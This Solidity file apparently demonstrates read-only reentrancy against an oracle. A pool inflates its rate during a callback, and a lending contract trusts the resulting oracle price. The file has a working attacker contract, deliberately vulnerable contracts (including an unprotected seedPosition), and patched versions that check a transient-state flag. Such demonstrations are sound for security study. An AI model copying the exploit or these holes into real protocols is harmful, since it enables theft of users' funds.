// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITransientPool {
    function getPoolTokens() external view returns (uint256 balance0, uint256 balance1);
    function getRate() external view returns (uint256);
    function exiting() external view returns (bool);
}

contract TransientPool is ITransientPool {
    uint256 public balance0 = 100;
    uint256 public balance1 = 100;
    uint256 public rate = 1e18;
    bool public exiting;

    function getPoolTokens() external view returns (uint256, uint256) {
        return (balance0, balance1);
    }

    function getRate() external view returns (uint256) {
        return rate;
    }

    function exitPool(address receiver) external {
        require(!exiting, "already exiting");
        exiting = true;
        rate = 3e18;
        (bool ok,) = receiver.call{value: 1 wei}("");
        require(ok, "callback failed");
        rate = 1e18;
        balance0 = 99;
        balance1 = 99;
        exiting = false;
    }

    receive() external payable {}
}

contract CrossProtocolOracle {
    ITransientPool public immutable pool;

    constructor(ITransientPool pool_) {
        pool = pool_;
    }

    function latestAnswer() external view returns (uint256) {
        (uint256 balance0, uint256 balance1) = pool.getPoolTokens();
        uint256 rate = pool.getRate();
        return (balance0 + balance1) * rate / 2e18;
    }
}

contract CollateralLending {
    CrossProtocolOracle public immutable oracle;

    mapping(address => uint256) public bptCollateral;
    mapping(address => uint256) public secondaryCollateral;
    mapping(address => uint256) public debt;
    mapping(address => bool) public secondaryEnabled;

    constructor(CrossProtocolOracle oracle_) {
        oracle = oracle_;
    }

    function seedPosition(address user, uint256 bpt, uint256 secondary, uint256 debt_) external {
        bptCollateral[user] = bpt;
        secondaryCollateral[user] = secondary;
        debt[user] = debt_;
        secondaryEnabled[user] = true;
    }

    function disableSecondaryCollateral() external {
        require(secondaryEnabled[msg.sender], "not enabled");
        uint256 remainingValue = bptCollateral[msg.sender] * oracle.latestAnswer();
        require(remainingValue >= debt[msg.sender], "insufficient remaining collateral");
        secondaryEnabled[msg.sender] = false;
    }

    function withdrawSecondary() external returns (uint256 amount) {
        require(!secondaryEnabled[msg.sender], "still collateral");
        amount = secondaryCollateral[msg.sender];
        secondaryCollateral[msg.sender] = 0;
    }
}

interface ILending {
    function disableSecondaryCollateral() external;
    function withdrawSecondary() external returns (uint256);
}

contract CrossProtocolAttacker {
    TransientPool public immutable pool;
    ILending public immutable lending;

    constructor(TransientPool pool_, ILending lending_) {
        pool = pool_;
        lending = lending_;
    }

    function attack() external {
        pool.exitPool(address(this));
    }

    function withdrawSecondary() external returns (uint256) {
        return lending.withdrawSecondary();
    }

    receive() external payable {
        lending.disableSecondaryCollateral();
    }
}

contract CrossProtocolOraclePatched {
    ITransientPool public immutable pool;

    constructor(ITransientPool pool_) {
        pool = pool_;
    }

    function latestAnswer() external view returns (uint256) {
        require(!pool.exiting(), "transient protocol state");
        (uint256 balance0, uint256 balance1) = pool.getPoolTokens();
        uint256 rate = pool.getRate();
        return (balance0 + balance1) * rate / 2e18;
    }
}

contract CrossProtocolLendingPatched {
    CrossProtocolOraclePatched public immutable oracle;
    mapping(address => uint256) public bptCollateral;
    mapping(address => uint256) public secondaryCollateral;
    mapping(address => uint256) public debt;
    mapping(address => bool) public secondaryEnabled;

    constructor(CrossProtocolOraclePatched oracle_) { oracle = oracle_; }

    function seedPosition(address user, uint256 bpt, uint256 secondary, uint256 debt_) external {
        bptCollateral[user] = bpt;
        secondaryCollateral[user] = secondary;
        debt[user] = debt_;
        secondaryEnabled[user] = true;
    }

    function disableSecondaryCollateral() external {
        require(secondaryEnabled[msg.sender], "not enabled");
        uint256 remainingValue = bptCollateral[msg.sender] * oracle.latestAnswer();
        require(remainingValue >= debt[msg.sender], "insufficient remaining collateral");
        secondaryEnabled[msg.sender] = false;
    }

    function withdrawSecondary() external returns (uint256 amount) {
        require(!secondaryEnabled[msg.sender], "still collateral");
        amount = secondaryCollateral[msg.sender];
        secondaryCollateral[msg.sender] = 0;
    }
}
